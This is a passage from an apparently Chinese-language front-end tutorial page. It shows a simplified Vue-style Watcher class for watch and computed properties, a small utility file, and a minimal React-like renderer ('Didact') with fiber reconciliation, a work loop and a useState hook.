<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br></div></div><ul>
<li>watcher.js</li>
</ul>
<div><pre><code><span>import</span> <span>{</span> pushTarget<span>,</span> popTarget <span>}</span> <span>from</span> <span>'./dep.js'</span>

<span>let</span> uid <span>=</span> <span>0</span>

<span>export</span> <span>default</span> <span>class</span> <span>Watcher</span> <span>{</span>
  vm
  cb
  id
  user
  value
  lazy
  dirty
  deps
  <span>constructor</span><span>(</span><span>vm<span>,</span> expOrFn<span>,</span> cb<span>,</span> options<span>,</span> isRenderWatcher</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>vm <span>=</span> vm
    <span>if</span> <span>(</span>isRenderWatcher<span>)</span> <span>{</span>
      vm<span>.</span>_watcher <span>=</span> <span>this</span>
    <span>}</span>
    vm<span>.</span>_watchers<span>.</span><span>push</span><span>(</span><span>this</span><span>)</span>

    <span>// 主要为 watch 的回调</span>
    <span>this</span><span>.</span>cb <span>=</span> cb
    <span>this</span><span>.</span>id <span>=</span> <span>++</span>uid

    <span>// watch 标识（多了错误提示）</span>
    <span>this</span><span>.</span>user <span>=</span> <span>!</span><span>!</span>options<span>.</span>user
    <span>// computed 标识</span>
    <span>this</span><span>.</span>lazy <span>=</span> <span>!</span><span>!</span>options<span>.</span>lazy
    <span>this</span><span>.</span>dirty <span>=</span> <span>this</span><span>.</span>lazy

    <span>this</span><span>.</span>deps <span>=</span> <span>[</span><span>]</span>
    <span>// 字符串时（watch），获取值触发依赖收集，这里简化下</span>
    <span>this</span><span>.</span>getter <span>=</span> <span>typeof</span> expOrFn <span>===</span> <span>'function'</span> <span>?</span> <span>expOrFn</span> <span>:</span> <span>vm</span> <span>=></span> vm<span>[</span>expOrFn<span>]</span>
    <span>// computed 通过 evaluate 计算值</span>
    <span>this</span><span>.</span>value <span>=</span> <span>this</span><span>.</span>lazy <span>?</span> <span>undefined</span> <span>:</span> <span>this</span><span>.</span><span>get</span><span>(</span><span>)</span>
  <span>}</span>
  <span>// 求值及重新收集依赖</span>
  <span>get</span><span>(</span><span>)</span> <span>{</span>
    <span>pushTarget</span><span>(</span><span>this</span><span>)</span>
    <span>let</span> value
    <span>const</span> vm <span>=</span> <span>this</span><span>.</span>vm
    <span>// 所以 computed 的参数是组件实例</span>
    value <span>=</span> <span>this</span><span>.</span><span>getter</span><span>.</span><span>call</span><span>(</span>vm<span>,</span> vm<span>)</span>
    <span>popTarget</span><span>(</span><span>)</span>
    <span>return</span> value
  <span>}</span>
  <span>// 添加订阅</span>
  <span>addDep</span><span>(</span><span>dep</span><span>)</span> <span>{</span>
    dep<span>.</span><span>addSub</span><span>(</span><span>this</span><span>)</span>
  <span>}</span>
  <span>// 依赖变化执行</span>
  <span>update</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>lazy<span>)</span> <span>{</span>
      <span>// computed 依赖变化，将 dirty = true 来重新计算值</span>
      <span>this</span><span>.</span>dirty <span>=</span> <span>true</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>// 简化下 nextTick</span>
      Promise<span>.</span><span>resolve</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>this</span><span>.</span><span>run</span><span>(</span><span>)</span><span>)</span>
    <span>}</span>
  <span>}</span>
  <span>run</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> value <span>=</span> <span>this</span><span>.</span><span>get</span><span>(</span><span>)</span>
    <span>const</span> oldValue <span>=</span> <span>this</span><span>.</span>value
    <span>this</span><span>.</span>value <span>=</span> value
    <span>// 所以 watch 的回调可以获取新旧值</span>
    <span>this</span><span>.</span><span>cb</span><span>.</span><span>call</span><span>(</span><span>this</span><span>.</span>vm<span>,</span> value<span>,</span> oldValue<span>)</span>
  <span>}</span>
  <span>// computed 计算值</span>
  <span>evaluate</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>value <span>=</span> <span>this</span><span>.</span><span>get</span><span>(</span><span>)</span>
    <span>this</span><span>.</span>dirty <span>=</span> <span>false</span>
  <span>}</span>
  <span>// computed 添加订阅</span>
  <span>depend</span><span>(</span><span>)</span> <span>{</span>
    <span>let</span> i <span>=</span> <span>this</span><span>.</span>deps<span>.</span>length
    <span>while</span> <span>(</span>i<span>--</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>deps<span>[</span>i<span>]</span><span>.</span><span>depend</span><span>(</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br></div></div><ul>
<li>util.js</li>
</ul>
<div><pre><code><span>// 判断是否为对象</span>
<span>export</span> <span>function</span> <span>isObject</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>return</span> obj <span>!==</span> <span>null</span> <span>&amp;&amp;</span> <span>typeof</span> obj <span>===</span> <span>'object'</span>
<span>}</span>

<span>// 空函数</span>
<span>export</span> <span>function</span> <span>noop</span><span>(</span><span>)</span> <span>{</span><span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><ul>
<li><a href="https://codepen.io/coderljw/project/editor/AjkRnY" target="_blank" rel="noopener noreferrer">Demo</a></li>
</ul>
<h2 id="_10-react"> 10. React</h2>
<div><pre><code><span>// 创建虚拟DOM</span>
<span>function</span> <span>createElement</span><span>(</span><span>type<span>,</span> props<span>,</span> <span>...</span>children</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span>
    type<span>,</span>
    <span>props</span><span>:</span> <span>{</span>
      <span>...</span>props<span>,</span>
      <span>// 区分文本节点</span>
      <span>children</span><span>:</span> children<span>.</span><span>map</span><span>(</span><span>child</span> <span>=></span>
        <span>typeof</span> child <span>===</span> <span>'object'</span> <span>?</span> child <span>:</span> <span>createTextElement</span><span>(</span>child<span>)</span>
      <span>)</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>

<span>// 创建虚拟文本节点</span>
<span>function</span> <span>createTextElement</span><span>(</span><span>text</span><span>)</span> <span>{</span>
  <span>return</span> <span>{</span>
    <span>type</span><span>:</span> <span>'TEXT_ELEMENT'</span><span>,</span>
    <span>props</span><span>:</span> <span>{</span>
      <span>nodeValue</span><span>:</span> text<span>,</span>
      <span>children</span><span>:</span> <span>[</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span>

<span>// 创建真实DOM</span>
<span>function</span> <span>createDom</span><span>(</span><span>fiber</span><span>)</span> <span>{</span>
  <span>const</span> dom <span>=</span>
    fiber<span>.</span>type <span>==</span> <span>'TEXT_ELEMENT'</span>
      <span>?</span> document<span>.</span><span>createTextNode</span><span>(</span><span>''</span><span>)</span>
      <span>:</span> document<span>.</span><span>createElement</span><span>(</span>fiber<span>.</span>type<span>)</span>

  <span>updateDom</span><span>(</span>dom<span>,</span> <span>{</span><span>}</span><span>,</span> fiber<span>.</span>props<span>)</span>

  <span>return</span> dom
<span>}</span>

<span>// 是否为事件属性</span>
<span>const</span> <span>isEvent</span> <span>=</span> <span>key</span> <span>=></span> key<span>.</span><span>startsWith</span><span>(</span><span>'on'</span><span>)</span>
<span>// 是否为除children和事件外的属性</span>
<span>const</span> <span>isProperty</span> <span>=</span> <span>key</span> <span>=></span> key <span>!==</span> <span>'children'</span> <span>&amp;&amp;</span> <span>!</span><span>isEvent</span><span>(</span>key<span>)</span>
<span>// 是否为新增属性</span>
<span>const</span> <span>isNew</span> <span>=</span> <span>(</span><span>prev<span>,</span> next</span><span>)</span> <span>=></span> <span>key</span> <span>=></span> prev<span>[</span>key<span>]</span> <span>!==</span> next<span>[</span>key<span>]</span>
<span>// 是否为移除属性</span>
<span>const</span> <span>isGone</span> <span>=</span> <span>(</span><span>prev<span>,</span> next</span><span>)</span> <span>=></span> <span>key</span> <span>=></span> <span>!</span><span>(</span>key <span>in</span> next<span>)</span>

<span>// 更新真实DOM</span>
<span>function</span> <span>updateDom</span><span>(</span><span>dom<span>,</span> prevProps<span>,</span> nextProps</span><span>)</span> <span>{</span>
  <span>// 移除旧事件</span>
  Object<span>.</span><span>keys</span><span>(</span>prevProps<span>)</span>
    <span>.</span><span>filter</span><span>(</span>isEvent<span>)</span>
    <span>.</span><span>filter</span><span>(</span><span>key</span> <span>=></span> <span>!</span><span>(</span>key <span>in</span> nextProps<span>)</span> <span>||</span> <span>isNew</span><span>(</span>prevProps<span>,</span> nextProps<span>)</span><span>(</span>key<span>)</span><span>)</span>
    <span>.</span><span>forEach</span><span>(</span><span>name</span> <span>=></span> <span>{</span>
      <span>const</span> eventType <span>=</span> name<span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span>
      dom<span>.</span><span>removeEventListener</span><span>(</span>eventType<span>,</span> prevProps<span>[</span>name<span>]</span><span>)</span>
    <span>}</span><span>)</span>

  <span>// 移除旧属性</span>
  Object<span>.</span><span>keys</span><span>(</span>prevProps<span>)</span>
    <span>.</span><span>filter</span><span>(</span>isProperty<span>)</span>
    <span>.</span><span>filter</span><span>(</span><span>isGone</span><span>(</span>prevProps<span>,</span> nextProps<span>)</span><span>)</span>
    <span>.</span><span>forEach</span><span>(</span><span>name</span> <span>=></span> <span>{</span>
      dom<span>[</span>name<span>]</span> <span>=</span> <span>''</span>
    <span>}</span><span>)</span>

  <span>// 添加/更新属性</span>
  Object<span>.</span><span>keys</span><span>(</span>nextProps<span>)</span>
    <span>.</span><span>filter</span><span>(</span>isProperty<span>)</span>
    <span>.</span><span>filter</span><span>(</span><span>isNew</span><span>(</span>prevProps<span>,</span> nextProps<span>)</span><span>)</span>
    <span>.</span><span>forEach</span><span>(</span><span>name</span> <span>=></span> <span>{</span>
      dom<span>[</span>name<span>]</span> <span>=</span> nextProps<span>[</span>name<span>]</span>
    <span>}</span><span>)</span>

  <span>// 添加事件</span>
  Object<span>.</span><span>keys</span><span>(</span>nextProps<span>)</span>
    <span>.</span><span>filter</span><span>(</span>isEvent<span>)</span>
    <span>.</span><span>filter</span><span>(</span><span>isNew</span><span>(</span>prevProps<span>,</span> nextProps<span>)</span><span>)</span>
    <span>.</span><span>forEach</span><span>(</span><span>name</span> <span>=></span> <span>{</span>
      <span>const</span> eventType <span>=</span> name<span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span>
      dom<span>.</span><span>addEventListener</span><span>(</span>eventType<span>,</span> nextProps<span>[</span>name<span>]</span><span>)</span>
    <span>}</span><span>)</span>
<span>}</span>

<span>// commit阶段</span>
<span>function</span> <span>commitRoot</span><span>(</span><span>)</span> <span>{</span>
  <span>// 删除收集的旧节点</span>
  deletions<span>.</span><span>forEach</span><span>(</span>commitWork<span>)</span>
  <span>// 提交挂载节点</span>
  <span>commitWork</span><span>(</span>wipRoot<span>.</span>child<span>)</span>
  <span>// 保存最后提交的fiber树</span>
  currentRoot <span>=</span> wipRoot
  <span>// 置空工作中的fiber树</span>
  wipRoot <span>=</span> <span>null</span>
<span>}</span>

<span>function</span> <span>commitWork</span><span>(</span><span>fiber</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>fiber<span>)</span> <span>{</span>
    <span>return</span>
  <span>}</span>

  <span>let</span> domParentFiber <span>=</span> fiber<span>.</span>parent
  <span>// 向上查找有节点的fiber（处理函数组件）</span>
  <span>while</span> <span>(</span><span>!</span>domParentFiber<span>.</span>dom<span>)</span> <span>{</span>
    domParentFiber <span>=</span> domParentFiber<span>.</span>parent
  <span>}</span>
  <span>const</span> domParent <span>=</span> domParentFiber<span>.</span>dom

  <span>if</span> <span>(</span>fiber<span>.</span>effectTag <span>===</span> <span>'PLACEMENT'</span> <span>&amp;&amp;</span> fiber<span>.</span>dom <span>!=</span> <span>null</span><span>)</span> <span>{</span>
    <span>// 新增节点</span>
    domParent<span>.</span><span>appendChild</span><span>(</span>fiber<span>.</span>dom<span>)</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span>fiber<span>.</span>effectTag <span>===</span> <span>'UPDATE'</span> <span>&amp;&amp;</span> fiber<span>.</span>dom <span>!=</span> <span>null</span><span>)</span> <span>{</span>
    <span>// 更新节点属性/事件</span>
    <span>updateDom</span><span>(</span>fiber<span>.</span>dom<span>,</span> fiber<span>.</span>alternate<span>.</span>props<span>,</span> fiber<span>.</span>props<span>)</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span>fiber<span>.</span>effectTag <span>===</span> <span>'DELETION'</span><span>)</span> <span>{</span>
    <span>// 删除节点</span>
    <span>commitDeletion</span><span>(</span>fiber<span>,</span> domParent<span>)</span>
  <span>}</span>

  <span>commitWork</span><span>(</span>fiber<span>.</span>child<span>)</span>
  <span>commitWork</span><span>(</span>fiber<span>.</span>sibling<span>)</span>
<span>}</span>

<span>// 删除节点</span>
<span>function</span> <span>commitDeletion</span><span>(</span><span>fiber<span>,</span> domParent</span><span>)</span> <span>{</span>
  <span>// 向下查找有节点的fiber（处理函数组件）</span>
  <span>if</span> <span>(</span>fiber<span>.</span>dom<span>)</span> <span>{</span>
    domParent<span>.</span><span>removeChild</span><span>(</span>fiber<span>.</span>dom<span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>commitDeletion</span><span>(</span>fiber<span>.</span>child<span>,</span> domParent<span>)</span>
  <span>}</span>
<span>}</span>

<span>// Renderer（渲染器）</span>
<span>function</span> <span>render</span><span>(</span><span>element<span>,</span> container</span><span>)</span> <span>{</span>
  wipRoot <span>=</span> <span>{</span>
    <span>dom</span><span>:</span> container<span>,</span>
    <span>props</span><span>:</span> <span>{</span>
      <span>children</span><span>:</span> <span>[</span>element<span>]</span><span>,</span>
    <span>}</span><span>,</span>
    <span>alternate</span><span>:</span> currentRoot<span>,</span>
  <span>}</span>
  deletions <span>=</span> <span>[</span><span>]</span>
  nextUnitOfWork <span>=</span> wipRoot
<span>}</span>

<span>// 下一个工作单元</span>
<span>let</span> nextUnitOfWork <span>=</span> <span>null</span>
<span>// 最后提交的fiber树</span>
<span>let</span> currentRoot <span>=</span> <span>null</span>
<span>// 工作中的fiber树</span>
<span>let</span> wipRoot <span>=</span> <span>null</span>
<span>// 要删除的旧节点</span>
<span>let</span> deletions <span>=</span> <span>null</span>

<span>// Scheduler（调度器）</span>
<span>function</span> <span>workLoop</span><span>(</span><span>deadline</span><span>)</span> <span>{</span>
  <span>// 控制是否暂停渲染</span>
  <span>let</span> shouldYield <span>=</span> <span>false</span>
  <span>// 循环检查</span>
  <span>while</span> <span>(</span>nextUnitOfWork <span>&amp;&amp;</span> <span>!</span>shouldYield<span>)</span> <span>{</span>
    <span>// 执行工作单元，并返回下一个工作单元</span>
    nextUnitOfWork <span>=</span> <span>performUnitOfWork</span><span>(</span>nextUnitOfWork<span>)</span>
    <span>// 判断浏览器空闲时间是否充足</span>
    shouldYield <span>=</span> deadline<span>.</span><span>timeRemaining</span><span>(</span><span>)</span> <span>&lt;</span> <span>1</span>
  <span>}</span>

  <span>// 所有工作单元执行完毕后，进行提交</span>
  <span>if</span> <span>(</span><span>!</span>nextUnitOfWork <span>&amp;&amp;</span> wipRoot<span>)</span> <span>{</span>
    <span>commitRoot</span><span>(</span><span>)</span>
  <span>}</span>

  <span>// 循环调用</span>
  <span>requestIdleCallback</span><span>(</span>workLoop<span>)</span>
<span>}</span>

<span>requestIdleCallback</span><span>(</span>workLoop<span>)</span>

<span>// 查找下一个工作单元</span>
<span>function</span> <span>performUnitOfWork</span><span>(</span><span>fiber</span><span>)</span> <span>{</span>
  <span>// 区分函数组件</span>
  <span>const</span> isFunctionComponent <span>=</span> fiber<span>.</span>type <span>instanceof</span> <span>Function</span>
  <span>if</span> <span>(</span>isFunctionComponent<span>)</span> <span>{</span>
    <span>updateFunctionComponent</span><span>(</span>fiber<span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>updateHostComponent</span><span>(</span>fiber<span>)</span>
  <span>}</span>
  <span>// 深度优先遍历</span>
  <span>if</span> <span>(</span>fiber<span>.</span>child<span>)</span> <span>{</span>
    <span>return</span> fiber<span>.</span>child
  <span>}</span>
  <span>let</span> nextFiber <span>=</span> fiber
  <span>while</span> <span>(</span>nextFiber<span>)</span> <span>{</span>
    <span>if</span> <span>(</span>nextFiber<span>.</span>sibling<span>)</span> <span>{</span>
      <span>return</span> nextFiber<span>.</span>sibling
    <span>}</span>
    nextFiber <span>=</span> nextFiber<span>.</span>parent
  <span>}</span>
<span>}</span>

<span>// 保存当前fiber</span>
<span>let</span> wipFiber <span>=</span> <span>null</span>
<span>// 记录hooks执行索引</span>
<span>let</span> hookIndex <span>=</span> <span>null</span>

<span>// 更新函数组件</span>
<span>function</span> <span>updateFunctionComponent</span><span>(</span><span>fiber</span><span>)</span> <span>{</span>
  wipFiber <span>=</span> fiber
  hookIndex <span>=</span> <span>0</span>
  wipFiber<span>.</span>hooks <span>=</span> <span>[</span><span>]</span>
  <span>// 执行函数获取节点</span>
  <span>const</span> children <span>=</span> <span>[</span>fiber<span>.</span><span>type</span><span>(</span>fiber<span>.</span>props<span>)</span><span>]</span>
  <span>reconcileChildren</span><span>(</span>fiber<span>,</span> children<span>)</span>
<span>}</span>

<span>// Hooks</span>
<span>function</span> <span>useState</span><span>(</span><span>initial</span><span>)</span> <span>{</span>
  <span>const</span> oldHook <span>=</span>
    wipFiber<span>.</span>alternate <span>&amp;&amp;</span>
    wipFiber<span>.</span>alternate<span>.</span>hooks <span>&amp;&amp;</span>
    wipFiber<span>.</span>alternate<span>.</span>hooks<span>[</span>hookIndex<span>]</span>
  <span>const</span> hook <span>=</span> <span>{</span>
    <span>// 有旧hook使用旧状态，没有就用初始状态</span>
    <span>state</span><span>:</span> oldHook <span>?</span> oldHook<span>.</span>state <span>:</span> initial<span>,</span>
    <span>// hook更新队列</span>
    <span>queue</span><span>:</span> <span>[</span><span>]</span><span>,</span>
  <span>}</span>

  <span>const</span> actions <span>=</span> oldHook <span>?</span> oldHook<span>.</span>queue <span>:</span> <span>[</span><span>]</span>
  actions<span>.</span><span>forEach</span><span>(</span><span>action</span> <span>=></span> <span>{</span>
    hook<span>.</span>state <span>=</span> <span>action</span><span>(</span>hook<span>.</span>state<span>)</span>
  <span>}</span><span>)</span>

  <span>const</span> <span>setState</span> <span>=</span> <span>action</span> <span>=></span> <span>{</span>
    hook<span>.</span>queue<span>.</span><span>push</span><span>(</span>action<span>)</span>
    wipRoot <span>=</span> <span>{</span>
      <span>dom</span><span>:</span> currentRoot<span>.</span>dom<span>,</span>
      <span>props</span><span>:</span> currentRoot<span>.</span>props<span>,</span>
      <span>alternate</span><span>:</span> currentRoot<span>,</span>
    <span>}</span>
    <span>// 设置为下一个工作单元，以便进行渲染</span>
    nextUnitOfWork <span>=</span> wipRoot
    deletions <span>=</span> <span>[</span><span>]</span>
  <span>}</span>

  wipFiber<span>.</span>hooks<span>.</span><span>push</span><span>(</span>hook<span>)</span>
  hookIndex<span>++</span>
  <span>return</span> <span>[</span>hook<span>.</span>state<span>,</span> setState<span>]</span>
<span>}</span>

<span>// 更新普通类型节点组件</span>
<span>function</span> <span>updateHostComponent</span><span>(</span><span>fiber</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span>fiber<span>.</span>dom<span>)</span> <span>{</span>
    fiber<span>.</span>dom <span>=</span> <span>createDom</span><span>(</span>fiber<span>)</span>
  <span>}</span>
  <span>reconcileChildren</span><span>(</span>fiber<span>,</span> fiber<span>.</span>props<span>.</span>children<span>)</span>
<span>}</span>

<span>// Reconciler（协调器）</span>
<span>function</span> <span>reconcileChildren</span><span>(</span><span>wipFiber<span>,</span> elements</span><span>)</span> <span>{</span>
  <span>let</span> index <span>=</span> <span>0</span>
  <span>let</span> oldFiber <span>=</span> wipFiber<span>.</span>alternate <span>&amp;&amp;</span> wipFiber<span>.</span>alternate<span>.</span>child
  <span>let</span> prevSibling <span>=</span> <span>null</span>

  <span>while</span> <span>(</span>index <span>&lt;</span> elements<span>.</span>length <span>||</span> oldFiber <span>!=</span> <span>null</span><span>)</span> <span>{</span>
    <span>const</span> element <span>=</span> elements<span>[</span>index<span>]</span>
    <span>let</span> newFiber <span>=</span> <span>null</span>

    <span>const</span> sameType <span>=</span> oldFiber <span>&amp;&amp;</span> element <span>&amp;&amp;</span> element<span>.</span>type <span>==</span> oldFiber<span>.</span>type

    <span>// 类型相同，更新属性</span>
    <span>if</span> <span>(</span>sameType<span>)</span> <span>{</span>
      newFiber <span>=</span> <span>{</span>
        <span>type</span><span>:</span> oldFiber<span>.</span>type<span>,</span>
        <span>props</span><span>:</span> element<span>.</span>props<span>,</span>
        <span>dom</span><span>:</span> oldFiber<span>.</span>dom<span>,</span>
        <span>parent</span><span>:</span> wipFiber<span>,</span>
        <span>alternate</span><span>:</span> oldFiber<span>,</span>
        <span>effectTag</span><span>:</span> <span>'UPDATE'</span><span>,</span>
      <span>}</span>
    <span>}</span>
    <span>// 类型不同，并且有新的元素，则创建一个新的节点</span>
    <span>if</span> <span>(</span>element <span>&amp;&amp;</span> <span>!</span>sameType<span>)</span> <span>{</span>
      newFiber <span>=</span> <span>{</span>
        <span>type</span><span>:</span> element<span>.</span>type<span>,</span>
        <span>props</span><span>:</span> element<span>.</span>props<span>,</span>
        <span>dom</span><span>:</span> <span>null</span><span>,</span>
        <span>parent</span><span>:</span> wipFiber<span>,</span>
        <span>alternate</span><span>:</span> <span>null</span><span>,</span>
        <span>effectTag</span><span>:</span> <span>'PLACEMENT'</span><span>,</span>
      <span>}</span>
    <span>}</span>
    <span>// 类型不同，并且有旧的fiber，则删除旧节点</span>
    <span>if</span> <span>(</span>oldFiber <span>&amp;&amp;</span> <span>!</span>sameType<span>)</span> <span>{</span>
      oldFiber<span>.</span>effectTag <span>=</span> <span>'DELETION'</span>
      <span>// 收集要删除的旧节点</span>
      deletions<span>.</span><span>push</span><span>(</span>oldFiber<span>)</span>
    <span>}</span>

    <span>// 比较兄弟fiber</span>
    <span>if</span> <span>(</span>oldFiber<span>)</span> <span>{</span>
      oldFiber <span>=</span> oldFiber<span>.</span>sibling
    <span>}</span>

    <span>// 第一个子元素作为child，其余的子元素作为sibling</span>
    <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
      wipFiber<span>.</span>child <span>=</span> newFiber
    <span>}</span> <span>else</span> <span>if</span> <span>(</span>element<span>)</span> <span>{</span>
      prevSibling<span>.</span>sibling <span>=</span> newFiber
    <span>}</span>

    prevSibling <span>=</span> newFiber
    index<span>++</span>
  <span>}</span>
<span>}</span>

<span>const</span> Didact <span>=</span> <span>{</span>
  createElement<span>,</span>
  render<span>,</span>
  useState<span>,</span>
<span>}</span>

<span>export</span> <span>default</span> Didact
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br><span>190</span><br><span>191</span><br><span>192</span><br><span>193</span><br><span>194</span><br><span>195</span><br><span>196</span><br><span>197</span><br><span>198</span><br><span>199</span><br><span>200</span><br><span>201</span><br><span>202</span><br><span>203</span><br><span>204</span><br><span>205</span><br><span>206</span><br><span>207</span><br><span>208</span><br><span>209</span><br><span>210</span><br><span>211</span><br><span>212</span><br><span>213</span><br><span>214</span><br><span>215</span><br><span>216</span><br><span>217</span><br><span>218</span><br><span>219</span><br><span>220</span><br><span>221</span><br><span>222</span><br><span>223</span><br><span>224</span><br><span>225</span><br><span>226</span><br><span>227</span><br><span>228</span><br><span>229</span><br><span>230</span><br><span>231</span><br><span>232</span><br><span>233</span><br><span>234</span><br><span>235</span><br><span>236</span><br><span>237</span><br><span>238</span><br><span>239</span><br><span>240</span><br><span>241</span><br><span>242</span><br><span>243</span><br><span>244</span><br><span>245</span><br><span>246</span><br><span>247</span><br><span>248</span><br><span>249</span><br><span>250</span><br><span>251</span><br><span>252</span><br><span>253</span><br><span>254</span><br><span>255</span><br><span>256</span><br><span>257</span><br><span>258</span><br><span>259</span><br><span>260</span><br><span>261</span><br><span>262</span><br><span>263</span><br><span>264</span><br><span>265</span><br><span>266</span><br><span>267</span><br><span>268</span><br><span>269</span><br><span>270</span><br><span>271</span><br><span>272</span><br><span>273</span><br><span>274</span><br><span>275</span><br><span>276</span><br><span>277</span><br><span>278</span><br><span>279</span><br><span>280</span><br><span>281</span><br><span>282</span><br><span>283</span><br><span>284</span><br><span>285</span><br><span>286</span><br><span>287</span><br><span>288</span><br><span>289</span><br><span>290</span><br><span>291</span><br><span>292</span><br><span>293</span><br><span>294</span><br><span>295</span><br><span>296</span><br><span>297</span><br><span>298</span><br><span>299</span><br><span>300</span><br><span>301</span><br><span>302</span><br><span>303</span><br><span>304</span><br><span>305</span><br><span>306</span><br><span>307</span><br><span>308</span><br><span>309</span><br><span>310</span><br><span>311</span><br><span>312</span><br><span>313</span><br><span>314</span><br><span>315</span><br><span>316</span><br><span>317</span><br><span>318</span><br><span>319</span><br><span>320</span><br><span>321</span><br><span>322</span><br></d